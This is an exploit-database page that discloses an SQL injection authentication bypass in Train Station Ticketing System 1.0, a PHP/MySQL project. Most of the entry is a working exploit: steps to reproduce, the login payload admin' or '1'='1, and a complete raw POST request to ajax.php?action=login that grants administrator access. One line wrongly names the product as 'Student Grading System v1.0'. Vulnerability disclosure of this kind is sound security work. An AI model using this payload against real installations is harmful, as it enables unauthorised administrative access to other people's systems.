---
title: Train Station Ticketing System 1.0 - SQLi Authentication Bypass
url: https://cxsecurity.com/issue/WLB-2022100056
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-20
fetch_date: 2025-10-03T20:20:13.461069
---

# Train Station Ticketing System 1.0 - SQLi Authentication Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Train Station Ticketing System 1.0 - SQLi Authentication Bypass** **2022.10.19**  **![tr](https://cert.cx/cxstatic/images/flags/tr.png) [cs16snow](https://cxsecurity.com/author/cs16snow/1/) **(TR)** ![tr](https://cert.cx/cxstatic/images/flags/tr.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Train Station Ticketing System 1.0 - SQLi Authentication Bypass
# Date: 08.09.2022
# Exploit Author: cs16snow
# Author Email: testimiyapipcikcam@gmail.com
# Vendor Homepage: https://www.sourcecodester.com/php/14572/train-station-ticketing-system-using-phpmysqli-source-code.html
# Software Link: https://www.sourcecodester.com/download-code?nid=14572&title=Train+Station+Ticketing+System+using+PHP%2FMySQLi+with+Source+Code
# Version: 1.0
# Tested on: Windows 11, Kali Linux
# Student Grading System v1.0 Login page can be bypassed with a simple SQLi to the username parameter.
Steps To Reproduce:
1 - Go to the login page http://localhost/train\_ticketing/login.php
2 - Enter the payload to username field as "admin' or '1'='1" without double-quotes and type anything to password field.
3 - Click on "Login" button and you are logged in as administrator.
PoC
POST /train\_ticketing/ajax.php?action=login HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: \*/\*
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 45
Origin: http://localhost
Connection: close
Referer: http://localhost/train\_ticketing/login.php
Cookie: PHPSESSID=j5dch97u6g1jb138velpqk5a3p
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
username=admin'+or+'1'%3D'1&password=anything

**##### References:**

https://www.sourcecodester.com/download-code?nid=14572&title=Train+Station+Ticketing+System+using+PHP%2FMySQLi+with+Source+Code

https://www.sourcecodester.com/php/14572/train-station-ticketing-system-using-phpmysqli-source-code.html

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100056)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top